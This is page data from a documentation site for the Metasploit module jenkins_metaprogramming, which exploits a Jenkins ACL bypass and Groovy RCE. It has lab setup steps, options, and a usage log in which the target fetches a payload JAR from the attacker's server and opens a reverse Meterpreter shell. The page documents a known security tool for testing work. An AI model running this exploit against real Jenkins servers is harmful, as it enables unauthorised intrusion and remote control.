{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/jenkins_metaprogramming","result":{"data":{"moduleMetadataJson":{"id":"507af9c5-e76a-5eac-acc3-f23e97754067","name":"Jenkins ACL Bypass and Metaprogramming RCE","fullname":"exploit/multi/http/jenkins_metaprogramming","description":"This module exploits a vulnerability in Jenkins dynamic routing to\n        bypass the Overall/Read ACL and leverage Groovy metaprogramming to\n        download and execute a malicious JAR file.\n\n        When the \"Java Dropper\" target is selected, the original entry point\n        based on classLoader.parseClass is used, which requires the use of\n        Groovy metaprogramming to achieve RCE.\n\n        When the \"Unix In-Memory\" target is selected, a newer, higher-level,\n        and more universal entry point based on GroovyShell.parse is used.\n        This permits the use of in-memory arbitrary command execution.\n\n        The ACL bypass gadget is specific to Jenkins <= 2.137 and will not work\n        on later versions of Jenkins.\n\n        Tested against Jenkins 2.137 and Pipeline: Groovy Plugin 2.61.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/jenkins_metaprogramming","documentationSlug":"/modules/documentation/exploit/multi/http/jenkins_metaprogramming"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module exploits a vulnerability in Jenkins dynamic routing to\nbypass the <code class=\"language-text\">Overall/Read</code> ACL and leverage Groovy metaprogramming to\ndownload and execute a malicious JAR file.</p>\n<p>When the <code class=\"language-text\">Java Dropper</code> target is selected, the original entry point\nbased on <code class=\"language-text\">classLoader.parseClass</code> is used, which requires the use of\nGroovy metaprogramming to achieve RCE.</p>\n<p>When the <code class=\"language-text\">Unix In-Memory</code> target is selected, a newer, higher-level,\nand more universal entry point based on <code class=\"language-text\">GroovyShell.parse</code> is used.\nThis permits the use of in-memory arbitrary command execution.</p>\n<p>The ACL bypass gadget is specific to Jenkins &#x3C;= 2.137 and will not work\non later versions of Jenkins.</p>\n<p>Tested against Jenkins 2.137 and Pipeline: Groovy Plugin 2.61.</p>\n<h2 id=\"setup\" style=\"position:relative;\"><a href=\"#setup\" aria-label=\"setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Setup</h2>\n<ol>\n<li><code class=\"language-text\">git clone https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</code></li>\n<li><code class=\"language-text\">cd cve-2019-1003000-jenkins-rce-poc/sample-vuln</code></li>\n<li>Edit <code class=\"language-text\">run.sh</code> and change <code class=\"language-text\">2.152-alpine</code> to <code class=\"language-text\">2.137</code></li>\n<li><code class=\"language-text\">./run.sh</code></li>\n</ol>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Id  Name\n--  ----\n0   Unix In-Memory\n1   Java Dropper</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>RPORT</strong></p>\n<p>Set this to the Jenkins port. The default is 8080.</p>\n<p><strong>TARGETURI</strong></p>\n<p>Set this to the Jenkins base path. The default is <code class=\"language-text\">/</code>.</p>\n<p><strong>SRVPORT</strong></p>\n<p>Set this to the port on which to serve the payload. Change it from 8080\nto something like 8081 if you are testing Jenkins locally on port 8080.</p>\n<p>This option is valid only for the <code class=\"language-text\">Java Dropper</code> target.</p>\n<p><strong>ForceExploit</strong></p>\n<p>Set this to <code class=\"language-text\">true</code> to override the <code class=\"language-text\">check</code> result during exploitation.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/http/jenkins_metaprogramming) &gt; run\n\n[*] Started HTTPS reverse handler on https://192.168.1.2:8443\n[*] Jenkins 2.137 detected\n[+] Jenkins 2.137 is a supported target\n[+] ACL bypass successful\n[*] Using URL: http://0.0.0.0:8081/\n[*] Local IP: http://192.168.1.2:8081/\n[*] Configuring Java Dropper target\n[*] Sending Jenkins and Groovy go-go-gadgets\n[*] HEAD /CarisaChristiansen/Rank/3.3.5/Rank-3.3.5.pom requested\n[-] Sending 404\n[*] HEAD /CarisaChristiansen/Rank/3.3.5/Rank-3.3.5.jar requested\n[+] Sending 200\n[*] GET /CarisaChristiansen/Rank/3.3.5/Rank-3.3.5.jar requested\n[+] Sending payload JAR\n[*] https://192.168.1.2:8443 handling request from 192.168.1.2; (UUID: qlrpxu6t) Staging java payload (54399 bytes) ...\n[*] Meterpreter session 1 opened (192.168.1.2:8443 -&gt; 192.168.1.2:58688) at 2019-03-15 18:57:24 -0500\n[*] Server stopped.\n[!] This exploit may require manual cleanup of &#39;$HOME/.groovy/grapes/CarisaChristiansen&#39; on the target\n\nmeterpreter &gt; getuid\nServer username: jenkins\nmeterpreter &gt; sysinfo\nComputer    : 6f21b8da2915\nOS          : Linux 4.9.93-linuxkit-aufs (amd64)\nMeterpreter : java/linux\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"507af9c5-e76a-5eac-acc3-f23e97754067"}}}